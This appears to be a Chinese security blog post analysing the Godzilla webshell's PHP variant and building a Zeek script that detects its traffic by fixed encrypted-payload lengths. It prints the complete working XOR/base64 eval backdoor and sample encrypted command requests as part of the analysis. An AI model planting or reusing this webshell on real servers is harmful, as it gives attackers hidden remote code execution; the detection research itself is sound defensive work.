> 原文链接: https://www.anquanke.com//post/id/224831 


# 巧用Zeek在流量层狩猎哥斯拉Godzilla


                                阅读量   
                                **231795**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">3</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0131895faa5c5116dc.jpg)](https://p5.ssl.qhimg.com/t0131895faa5c5116dc.jpg)



## 前言

“过市面所有静态查杀”、“流量加密过市面全部流量waf”，伴随着这样的标签，哥斯拉在今年的攻防演练活动中成功亮相。这是赐给红队的又一把尖刀，也让防守队雪上加霜。截至目前，主机层面的主流查杀工具均已覆盖了哥斯拉webshell静态规则，但流量层面的检测可能仍然要打一个问号。



## webshell分析

关于哥斯拉的功能，通过[《攻防礼盒：哥斯拉Godzilla Shell管理工具》](https://www.freebuf.com/sectool/247104.html)这篇文章可以有比较全面的了解。nercis在[《哥斯拉Godzilla运行原理探寻》](https://www.freebuf.com/sectool/252840.html)一文中通过生成的jsp版shell和客户端jar包向大家介绍了其运行原理。

由于哥斯拉在处理jsp和php时加密方式存在差异，本文将从php版的shell展开，对其运行原理再做一下总结和阐述。

先生成一个php静态shell，加密器选择`PHP_XOR_BASE64`。

[![](https://p5.ssl.qhimg.com/t01607bfc8ae51606a3.png)](https://p5.ssl.qhimg.com/t01607bfc8ae51606a3.png)

生成的shell代码如下：

```
&lt;?php
    session_start();
    @set_time_limit(0);
    @error_reporting(0);
    function E($D,$K)`{`
        for($i=0;$i&lt;strlen($D);$i++) `{`
            $D[$i] = $D[$i]^$K[$i+1&amp;15];
        `}`
        return $D;
    `}`
    function Q($D)`{`
        return base64_encode($D);
    `}`
    function O($D)`{`
        return base64_decode($D);
    `}`
    $P='s4kur4';
    $V='payload';
    $T='85f35deb278e136e';
    if (isset($_POST[$P]))`{`
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V]))`{`
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C`{`public function nvoke($p) `{`eval($p."");`}``}`
            $R=new C();
            $R-&gt;nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        `}`else`{`
            $_SESSION[$V]=$F;
        `}`
    `}`

```

其中比较核心的地方有两处，第一处是进行异或加密和解密的函数`E($D,$K)`，第二处是嵌套的两个`if`对哥斯拉客户端上传的代码做执行并得到结果。根据`$F=O(E(O($_POST[$P]),$T));`这行做逆向判断，可以得到哥斯拉客户端上传代码时的编码加密过程：

**原始代码 -&gt; Base64编码 -&gt; E函数进行异或加密 -&gt; 再Base64编码**

为了使客户端分离出结果，三个`echo`利用md5值作为分离标志，将得到的代码执行结果进行拼接：

**md5($P.$T)前16位**<br>**结果 -&gt; E函数进行异或加密 -&gt; Base64编码**<br>**md5($P.$T)后16位**

另外，根据`$_SESSION[$V]=$F;`这行判断，客户端首次连接shell时会在`$_SESSION`中保存一段代码，叫payload。结合后面突然出现的函数`run`，猜测这个payload在后续shell连接过程中可能会被调用。整个shell的运行原理到这里基本就能明确了，可以用下面的流程图来总结：

[![](https://p3.ssl.qhimg.com/t01689dd7c4dc8493d2.png)](https://p3.ssl.qhimg.com/t01689dd7c4dc8493d2.png)



## 特征提取

通常，流量层面对恶意行为进行检测，倾向于筛选出一些强特征、固定特征。例如检测使用ceye.io进行的OOB通信，只需要去匹配流量中包含`.+\.ceye\.io`的DNS请求，通过四元组即可判断受害主机和攻击者IP，这里`ceye.io`关键字就是固定特征。固定特征具有一致性、不易改变的特点，就好似与生俱来的特点。

### <a class="reference-link" name="%E6%8C%96%E6%8E%98%E5%93%A5%E6%96%AF%E6%8B%89%E5%BC%BA%E7%89%B9%E5%BE%81"></a>挖掘哥斯拉强特征

如何寻找哥斯拉的流量特征呢？最先想到的是先前冰蝎的捕获经验，即在shell的建连初期出现的强特征。至于HTTP头部的UA等特征，由于其易被改变，因此暂不考虑。开启Wireshark设置过滤条件，重新打开哥斯拉客户端并添加生成的shell：

[![](https://p2.ssl.qhimg.com/t01c0c0ca6affe8f774.gif)](https://p2.ssl.qhimg.com/t01c0c0ca6affe8f774.gif)

此时未出现任何流量。继续右键进入，哥斯拉会返回目标的相关信息，Wireshark瞬间出现3个http包：

[![](https://p4.ssl.qhimg.com/t01cf78b2c018cf3df3.gif)](https://p4.ssl.qhimg.com/t01cf78b2c018cf3df3.gif)

跟踪http流，发现3个http包处在同一TCP中，说明哥斯拉使用了TCP长连接，这对流量特征分析比较有利。对这3个http包逐个分析一下。

从shell的代码已知，客户端首次连接shell会上传一段代码payload，以备后续操作调用。查看其请求，发现内容长度居然超过23000字节。同时，http响应内容为空：

[![](https://p0.ssl.qhimg.com/t0173dc2b7d6d659b36.png)](https://p0.ssl.qhimg.com/t0173dc2b7d6d659b36.png)

使用`$F=O(E(O($_POST[$P]),$T))`对这一长串内容进行解密，得到payload的原始内容。好家伙，包含`run`、`bypass_open_basedir`、`formatParameter`、`evalFunc`等二十多个功能函数，具备代码执行、文件操作、数据库操作等诸多功能。

第二个http的请求内容为：

**s4kur4=VzFlBQUiW1ljVSNFaWJUU2dXaQM%2BICcLZ2lYDA%3D%3D**

解密得到原始代码`methodName=dGVzdA==`，即`methodName=test`。跟踪执行过程，发现最终目的是测试shell的连通情况，并向客户端打印输出`ok`。这个过程是典型的固定特征，与第一个http请求一样，上传的原始代码是固定的。

第三个http的作用是获取目标的环境信息，请求内容为：

**s4kur4=VzFlBQUiW1ljVSNFaWJUWXgKakIxMlN1UlUjaWdYFWxjHGVBPQsBC2dpWAw%3D**

解密得到原始代码`methodName=Z2V0QmFzaWNzSW5mbw==`，即`methodName=getBasicsInfo`。此操作调用payload中的`getBasicsInfo`方法获取目标环境信息向客户端返回。显然，这个过程又是一个固定特征。

至此，成功挖掘到哥斯拉客户端与shell建连初期的三个固定行为特征，且顺序出现在同一个TCP连接中。可以总结为：

**特征：发送一段固定代码（payload），http响应为空**<br>**特征：发送一段固定代码（test），执行结果为固定内容**<br>**特征：发送一段固定代码（getBacisInfo）**

### <a class="reference-link" name="%E5%BC%BA%E7%89%B9%E5%BE%81%E8%A7%84%E5%88%99%E5%8C%96"></a>强特征规则化

明确了三个紧密关联的特征后，需要对特征规则化。由于对内容的加密，即使哥斯拉每次都发送一段固定代码，检测引擎也无法通过规则直接匹配。另外，webshell的密码、密钥均不固定，代码加密后的密文也不同。

回看webshell代码，`$P`和`$T`在生成时属于非固定值，但在shell连接的整个生命周期，却又是固定值。`$T`是密钥的md5值前16位，属于唯一的加密因子，被用于与原始代码进行异或。哥斯拉进行异或加密时，循环使用加密因子`$T`的每一位与被加密字符串进行异或位运算。这就引出了第一个真理：
- **长度为l的字符串与长度为n的加密因子循环按位异或，密文的长度为l**
可以取出shell中的`E`函数，计算随机字符串的md5对固定字符串做异或，进行穷举验证：

[![](https://p3.ssl.qhimg.com/t01957d277c0101414b.png)](https://p3.ssl.qhimg.com/t01957d277c0101414b.png)

对于哥斯拉中频繁使用的Base64编码，又会引出真理二：
- **长度为l的字符串进行Base64编码后长度为定值**
熟悉Base64编码过程的同学应该知道，Base64本质上是由二进制向字符串转换的过程。对长度固定的随机字符串进行Base64编码，穷举验证：

[![](https://p3.ssl.qhimg.com/t0133b9d4c047d49658.png)](https://p3.ssl.qhimg.com/t0133b9d4c047d49658.png)

现在基本可以下结论了，即哥斯拉上传的三个固定代码，密文的长度是固定的。计算了一下，分别是23068、40、60。如此一来就能总结出以下三条规则：

[![](https://p0.ssl.qhimg.com/t01db68bd9913e07df5.png)](https://p0.ssl.qhimg.com/t01db68bd9913e07df5.png)



## Zeek巧妙落地

对规则的落地要依托流量层检测的基础设施，上面总结出的三条规则具有上下文关联性，传统的IDS无法直接实现。这里的难点在于，需要一次性对三个数据包做实时判断，并且需要对包内容做一些字符串的切割、解码操作。能想到的要么是大数据实时计算，要么是Zeek了。

想必熟悉Zeek的同学一定了解其统计框架[Summary Statistics](https://docs.zeek.org/en/current/frameworks/sumstats.html)，你可以对符合特定条件的数据进行统计、计算。例如统计同一个源IP发起的SSH登录行为并计算次数，在某个时间段内超过阈值`$threshold`就产生一条SSH暴力破解的告警。在哥斯拉的场景里，可以巧妙的用Zeek统计框架收集同一TCP连接中的http数据。Zeek脚本语言也完全满足统计数据以后的匹配计算。

先创建一个统计实例，设置延时`$epoch`为10秒，统计阈值`$threshold`为3，即统计10秒钟内产生的连续3个http包。当事件`http_message_done`发生时执行统计并收集数据：

```
event http_message_done(c: connection, is_orig: bool, stat: http_message_stat)
`{`
  if ( c?$http &amp;&amp; c$http?$status_code &amp;&amp; c$http?$method )
  `{`
    if ( c$http$status_code == 200 &amp;&amp; c$http$method == "POST" )
      `{`
        local key_str: string = c$http$uid + "$_$" + cat(c$id$orig_h) + "$_$" + cat(c$id$orig_p) + "$_$" + cat(c$http$status_code) + "$_$" + cat(c$id$resp_h)+ "$_$" + cat(c$id$resp_p) + "$_$" + c$http$uri;
        local observe_str: string = cat(c$http$ts) + "$_$" + c$http$client_body + "$_$" + c$http$server_body;
        SumStats::observe("godzilla_webshell_event", SumStats::Key($str=key_str), SumStats::Observation($str=observe_str));
      `}`
  `}`
`}`
```

其中，统计条件为同一TCP连接中HTTP响应为200的数据包，并且具备相同的URI。收集的数据内容主要为包的捕获时间、http请求内容、http响应内容。收集到符合这些条件的数据后数据被带进`$threshold_crossed`，此处开始对三个http包进行解析匹配：

```
if ( |result["godzilla_webshell_event"]$unique_vals| == 3 )
`{`
 for ( value in result["godzilla_webshell_event"]$unique_vals )
 `{`
  local observe_str_vector: vector of string = split_string(value$str, /\$_\$/);

  # 对请求内容进行URL解码
  observe_str_vector[1] = unescape_URI(observe_str_vector[1]);

  local request_body_only_value: string;
  # 从请求中分离出加密代码部分
  request_body_only_value = observe_str_vector[1][strstr(observe_str_vector[1], "=") : |observe_str_vector[1]|];

  # 规则1:
  # 发送的加密代码长度为23068 &amp;&amp; HTTP响应内容为空
  if ( |request_body_only_value| == 23068 &amp;&amp; |observe_str_vector[2]| == 0 )
  `{`
    sig1 = T;
  `}`

  local response_body: string = observe_str_vector[2];
  # 规则2: 
  # 加密代码长度为40 &amp;&amp; HTTP响应内容长度为40 &amp;&amp; 响应内容首尾各16位md5字符串
  if ( |request_body_only_value| == 40 &amp;&amp; |response_body| == 40 &amp;&amp; response_body == find_last(response_body, /[a-z0-9]`{`16`}`.+[a-z0-9]`{`16`}`/) )
  `{`
    sig2 = T;
  `}`

  # 规则3: 
  # 发送的加密代码长度为60 &amp;&amp; 响应内容首尾各16位md5字符串
  if ( |request_body_only_value| == 60 &amp;&amp; response_body == find_last(response_body, /[a-z0-9]`{`16`}`.+[a-z0-9]`{`16`}`/) )
  `{`
    sig3 = T;
  `}`
 `}`

 # 三个规则同时符合，进行告警
 if ( sig1 &amp;&amp; sig2 &amp;&amp; sig3 )
 `{`
  print fmt("[+] Godzilla traffic detected, %s:%s -&gt; %s:%s, webshell URI: %s", key_str_vector[1], key_str_vector[2], key_str_vector[4], key_str_vector[5], key_str_vector[6]);
 `}`
`}`
```

代码实现后，在服务器端启动PHP环境放置哥斯拉shell，启动Zeek监听网卡。本地客户端添加shell后点击进入，顺利打印出告警，令人欣慰：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01bb47470383d4d7fa.gif)



## 总结

本文从哥斯拉php版的异或加密shell出发，探索了一种流量层检测哥斯拉的思路和方法。由于哥斯拉php版shell还有另一种加密器，还支持jsp版、.net版等多种情况，鉴于篇幅和工作量，本文未做一一分析和覆盖。正如文章前言所述，其实这样的检测分析文章不舍得发，一旦发了可能才是检测困难真正的开始。
